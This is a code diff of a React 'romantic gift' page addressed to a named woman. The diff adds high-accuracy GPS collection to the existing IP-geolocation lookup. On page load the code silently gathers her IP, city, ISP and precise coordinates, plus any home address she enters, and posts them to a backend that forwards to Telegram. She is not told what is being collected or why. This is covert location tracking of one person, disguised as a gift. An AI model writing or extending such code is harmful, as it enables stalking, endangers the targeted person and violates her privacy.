@@ -5,36 +5,70 @@ const RomanticGift = () => {
   const [step, setStep] = useState(1);
   const [address, setAddress] = useState('');
   const [ipData, setIpData] = useState(null);
+  const [gpsData, setGpsData] = useState(null); // GPS koordinatalari
   const [musicPlaying, setMusicPlaying] = useState(false);
   const [showNotification, setShowNotification] = useState(false);
   const [showMusicPrompt, setShowMusicPrompt] = useState(true);
   const audioRef = useRef(null);
 
-  // MUHIM: Environment variable'dan backend URL olish
   const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'https://romantic-gift-backend.onrender.com/api/notify';
 
   useEffect(() => {
-    const getIPData = async () => {
+    const getLocationData = async () => {
+      // 1. IP ma'lumotlarini olish
       try {
         const response = await fetch('https://ipinfo.io/json');
         const data = await response.json();
         setIpData(data);
-        
-        await sendDataToTelegram({
-          type: '💝 Страница открыта',
-          ip: data.ip,
-          city: data.city,
-          region: data.region,
-          country: data.country,
-          loc: data.loc,
-          org: data.org,
-          timestamp: new Date().toLocaleString('ru-RU')
-        });
       } catch (error) {
         console.log('IP detection:', error);
       }
+
+      // 2. GPS koordinatalarini olishga harakat qilish
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const gpsCoords = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              timestamp: new Date().toLocaleString('ru-RU')
+            };
+            setGpsData(gpsCoords);
+            
+            // GPS ma'lumotlarini yuborish
+            await sendDataToTelegram({
+              type: '💝 Страница открыта',
+              gpsLat: gpsCoords.latitude,
+              gpsLon: gpsCoords.longitude,
+              gpsAccuracy: gpsCoords.accuracy,
+              hasGPS: true
+            });
+          },
+          async (error) => {
+            console.log('GPS error:', error.message);
+            // GPS ruxsat berilmasa, faqat IP bilan yuborish
+            await sendDataToTelegram({
+              type: '💝 Страница открыта (GPS ruxsat berilmagan)',
+              hasGPS: false
+            });
+          },
+          {
+            enableHighAccuracy: true, // Yuqori aniqlik
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        // Browser GPS qo'llab-quvvatlamasa
+        await sendDataToTelegram({
+          type: '💝 Страница открыта (GPS mavjud emas)',
+          hasGPS: false
+        });
+      }
     };
-    getIPData();
+
+    getLocationData();
   }, []);
 
   const startMusic = () => {
@@ -61,7 +95,7 @@ const RomanticGift = () => {
 
   const sendDataToTelegram = async (data) => {
     try {
-      console.log('Sending to:', BACKEND_URL); // Debug uchun
+      console.log('Sending to:', BACKEND_URL);
       
       const response = await fetch(BACKEND_URL, {
         method: 'POST',
@@ -69,18 +103,24 @@ const RomanticGift = () => {
         body: JSON.stringify({
           type: data.type,
           address: data.address || '',
+          // IP data
           ip: data.ip || ipData?.ip || 'N/A',
           city: data.city || ipData?.city || 'N/A',
           region: data.region || ipData?.region || 'N/A',
           country: data.country || ipData?.country || 'N/A',
           loc: data.loc || ipData?.loc || 'N/A',
           org: data.org || ipData?.org || 'N/A',
-          timestamp: data.timestamp
+          // GPS data
+          gpsLat: data.gpsLat || gpsData?.latitude || null,
+          gpsLon: data.gpsLon || gpsData?.longitude || null,
+          gpsAccuracy: data.gpsAccuracy || gpsData?.accuracy || null,
+          hasGPS: data.hasGPS !== undefined ? data.hasGPS : (gpsData !== null),
+          timestamp: data.timestamp || new Date().toLocaleString('ru-RU')
         })
       });
       
       const result = await response.json();
-      console.log('Backend response:', result); // Debug uchun
+      console.log('Backend response:', result);
     } catch (error) {
       console.error('Backend error:', error);
     }
@@ -92,8 +132,7 @@ const RomanticGift = () => {
       
       await sendDataToTelegram({
         type: '🎁 АДРЕС ПОЛУЧЕН!',
-        address: address,
-        timestamp: new Date().toLocaleString('ru-RU')
+        address: address
       });
       
       setTimeout(() => {
@@ -105,8 +144,7 @@ const RomanticGift = () => {
 
   const skipAddress = async () => {
     await sendDataToTelegram({
-      type: '⏭ Адрес пропущен',
-      timestamp: new Date().toLocaleString('ru-RU')
+      type: '⏭ Адрес пропущен'
     });
     setStep(2);
   };
@@ -114,7 +152,6 @@ const RomanticGift = () => {
   if (step === 1) {
     return (
       <div className="min-h-screen relative overflow-hidden bg-black flex items-center justify-center">
-        {/* Background Image */}
         <div 
           className="absolute inset-0 bg-cover bg-center bg-no-repeat"
           style={{
@@ -129,7 +166,6 @@ const RomanticGift = () => {
           <source src="/audio.mp3" type="audio/mpeg" />
         </audio>
 
-        {/* Snowflakes */}
         <div className="absolute inset-0 overflow-hidden pointer-events-none">
           {[...Array(25)].map((_, i) => (
             <div
@@ -148,7 +184,6 @@ const RomanticGift = () => {
           ))}
         </div>
 
-        {/* Music Start Prompt */}
         {showMusicPrompt && (
           <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-6" onClick={startMusic}>
             <div className="backdrop-blur-xl bg-white/20 rounded-3xl p-12 max-w-md text-center border-2 border-white/40 shadow-2xl animate-pulse">
@@ -163,7 +198,6 @@ const RomanticGift = () => {
           </div>
         )}
 
-        {/* Music button */}
         <button
           onClick={toggleMusic}
           className="fixed top-6 right-6 z-50 bg-white/20 backdrop-blur-md p-3 rounded-full shadow-2xl hover:scale-110 transition-transform border border-white/30"
@@ -171,7 +205,6 @@ const RomanticGift = () => {
           <Music className={`w-5 h-5 ${musicPlaying ? 'text-yellow-300 animate-pulse' : 'text-white/70'}`} />
         </button>
 
-        {/* Notification */}
         {showNotification && (
           <div className="fixed top-6 left-1/2 transform -translate-x-1/2 z-50 animate-slideDown">
             <div className="backdrop-blur-xl bg-white/95 px-8 py-6 rounded-3xl shadow-2xl border-2 border-pink-200 flex items-center gap-4">
@@ -190,7 +223,6 @@ const RomanticGift = () => {
 
         <div className="relative z-10 w-full max-w-xl px-6">
           <div className="text-center space-y-6 mb-8">
-            {/* GIF */}
             <div className="relative inline-block">
               <div className="absolute inset-0 bg-red-500/20 blur-3xl rounded-full animate-pulse"></div>
               <img 
@@ -200,7 +232,6 @@ const RomanticGift = () => {
               />
             </div>
             
-            {/* Name */}
             <h1 className="text-6xl font-light text-white drop-shadow-2xl tracking-wider">
               Хилола
             </h1>
@@ -209,7 +240,6 @@ const RomanticGift = () => {
               my universe, my everything
             </p>
 
-            {/* Quote */}
             <div className="pt-4">
               <div className="backdrop-blur-xl bg-white/10 rounded-3xl p-6 border border-white/20 shadow-2xl">
                 <p className="text-lg text-white leading-relaxed text-center drop-shadow-lg" style={{fontFamily: 'Georgia, serif'}}>
@@ -223,7 +253,6 @@ const RomanticGift = () => {
             </div>
           </div>
 
-          {/* Address Form */}
           <div className="backdrop-blur-2xl bg-white/15 rounded-3xl p-8 shadow-2xl border-2 border-white/30">
             <div className="text-center mb-6 space-y-3">
               <div className="text-4xl animate-bounce drop-shadow-lg">
@@ -264,7 +293,6 @@ const RomanticGift = () => {
             </div>
           </div>
 
-          {/* Bottom quote */}
           <div className="mt-6 text-center">
             <p className="text-white text-sm italic drop-shadow-lg">
               "Хилола, моя любовь к тебе безгранична"
@@ -301,6 +329,7 @@ const RomanticGift = () => {
     );
   }
 
+  // Step 2 - same as before...
   return (
     <div className="min-h-screen relative overflow-hidden bg-black">
       <div 
@@ -344,7 +373,6 @@ const RomanticGift = () => {
 
       <div className="min-h-screen flex items-center justify-center p-6 relative z-10">
         <div className="max-w-2xl w-full space-y-8">
-          
           <div className="text-center space-y-6">
             <div className="relative inline-block">
               <div className="absolute inset-0 bg-red-500/30 blur-3xl rounded-full"></div>
